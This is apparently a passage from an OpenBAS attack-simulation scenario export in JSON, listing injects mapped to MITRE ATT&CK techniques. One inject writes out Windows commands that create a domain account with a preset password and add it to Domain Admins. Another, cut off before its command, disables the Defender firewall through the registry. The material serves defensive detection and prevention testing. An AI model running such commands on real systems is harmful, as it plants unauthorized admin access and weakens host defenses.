          "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
          "phase_external_id" : "TA0005",
          "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
          "phase_name" : "Defense Evasion",
          "phase_shortname" : "defense-evasion",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
          "phase_order" : 6
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "be2c2bb0-5846-432c-9e4d-c8048aae44ff",
    "inject_title" : "Create a new Windows domain admin user",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ],
      "username" : "T1136.002_Admin",
      "password" : "T1136_pass123!",
      "group" : "Domain Admins"
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1140,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Create a new Windows domain admin user",
          "fr" : "Create a new Windows domain admin user"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "username",
          "label" : "username",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "T1136.002_Admin",
          "type" : "text"
        }, {
          "key" : "password",
          "label" : "password",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "T1136_pass123!",
          "type" : "text"
        }, {
          "key" : "group",
          "label" : "group",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "Domain Admins",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "93794665-7a99-4fc4-a07c-6d02bfd54f6d",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "93794665-7a99-4fc4-a07c-6d02bfd54f6d",
      "injector_contract_labels" : {
        "en" : "Create a new Windows domain admin user",
        "fr" : "Create a new Windows domain admin user"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Create a new Windows domain admin user\",\"fr\":\"Create a new Windows domain admin user\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"username\",\"label\":\"username\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"T1136.002_Admin\",\"type\":\"text\"},{\"key\":\"password\",\"label\":\"password\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"T1136_pass123!\",\"type\":\"text\"},{\"key\":\"group\",\"label\":\"group\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"Domain Admins\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"93794665-7a99-4fc4-a07c-6d02bfd54f6d\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "273f9612-1f74-4f03-99e3-ce3d05645dad",
        "payload_type" : "Command",
        "payload_name" : "Create a new Windows domain admin user",
        "payload_description" : "Creates a new domain admin user in a command prompt.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "c0f6ae0d-3873-4de1-827c-b1b95234b32e",
          "attack_pattern_name" : "Domain Account",
          "attack_pattern_description" : "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.(Citation: Savill 1999)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
          "attack_pattern_external_id" : "T1136.002",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "8bbdf37e-90c1-4e8a-98e9-a0fd61c92930",
            "phase_external_id" : "TA0003",
            "phase_stix_id" : "x-mitre-tactic--5bc1d813-693e-4823-9961-abf9af4b0e92",
            "phase_name" : "Persistence",
            "phase_shortname" : "persistence",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "phase_order" : 4
          } ]
        } ],
        "payload_cleanup_executor" : "cmd",
        "payload_cleanup_command" : "net user \"#{username}\" >nul 2>&1 /del /domain\n",
        "payload_elevation_required" : false,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "username",
          "default_value" : "T1136.002_Admin",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "password",
          "default_value" : "T1136_pass123!",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "group",
          "default_value" : "Domain Admins",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "fcec2963-9951-4173-9bfa-98d8b7834e62",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:14.475548Z",
        "payload_updated_at" : "2025-07-03T14:48:12.961423Z",
        "command_executor" : "cmd",
        "command_content" : "net user \"#{username}\" \"#{password}\" /add /domain\nnet group \"#{group}\" \"#{username}\" /add /domain\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:14.488883Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:14.488883Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "c0f6ae0d-3873-4de1-827c-b1b95234b32e",
        "attack_pattern_name" : "Domain Account",
        "attack_pattern_description" : "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.(Citation: Savill 1999)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
        "attack_pattern_external_id" : "T1136.002",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "8bbdf37e-90c1-4e8a-98e9-a0fd61c92930",
          "phase_external_id" : "TA0003",
          "phase_stix_id" : "x-mitre-tactic--5bc1d813-693e-4823-9961-abf9af4b0e92",
          "phase_name" : "Persistence",
          "phase_shortname" : "persistence",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
          "phase_order" : 4
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "007ac700-a241-41ab-9ee4-3f96a9d8b6cb",
    "inject_title" : "Disable Microsoft Defender Firewall via Registry",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1380,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Disable Microsoft Defender Firewall via Registry",
          "fr" : "Disable Microsoft Defender Firewall via Registry"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "c65c4c7a-8965-4650-95b7-bf5112dde97f",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "c65c4c7a-8965-4650-95b7-bf5112dde97f",
      "injector_contract_labels" : {
        "en" : "Disable Microsoft Defender Firewall via Registry",
        "fr" : "Disable Microsoft Defender Firewall via Registry"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Disable Microsoft Defender Firewall via Registry\",\"fr\":\"Disable Microsoft Defender Firewall via Registry\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"c65c4c7a-8965-4650-95b7-bf5112dde97f\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "425096bd-81c9-464b-a04f-ae1239d6b7bb",
        "payload_type" : "Command",
        "payload_name" : "Disable Microsoft Defender Firewall via Registry",
        "payload_description" : "Disables the Microsoft Defender Firewall for the public profile via registry\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "44f6bcb4-2c0e-498e-a7a0-9bb0858aafd9",
          "attack_pattern_name" : "Disable or Modify System Firewall",
          "attack_pattern_description" : "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse of various [Remote Services](https://attack.mitre.org/techniques/T1021) may also indirectly modify firewall rules.\n\nIn ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., via `esxcli network firewall set`) or via the vCenter user interface.(Citation: Trellix Rnasomhouse 2024)(Citation: Broadcom ESXi 